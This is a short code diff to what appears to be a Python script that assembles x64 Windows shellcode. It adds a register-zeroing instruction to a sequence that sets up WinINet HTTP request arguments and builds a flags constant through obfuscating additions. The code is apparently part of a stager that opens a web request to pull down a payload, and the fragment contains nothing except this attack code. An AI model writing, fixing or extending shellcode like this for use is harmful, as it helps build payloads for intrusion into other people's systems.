@@ -305,6 +305,7 @@ def main():
         "   mov r8, rsp                     ;"  # Third arg, lpszObjectName
         "   xor r9, r9                      ;"  # Fourth arg, lpszVersion
         "   push rdx                        ;"  # Eighth arg, dwContext, NULL
+        "   xor rax, rax                    ;"
         "   add rax, 0x60010000             ;"
         "   add rax, 0x33206963             ;"
         "   add rax, 0xfffffffff17ec89d     ;"  # Result: RAX = 0x84a03200, dwFlags
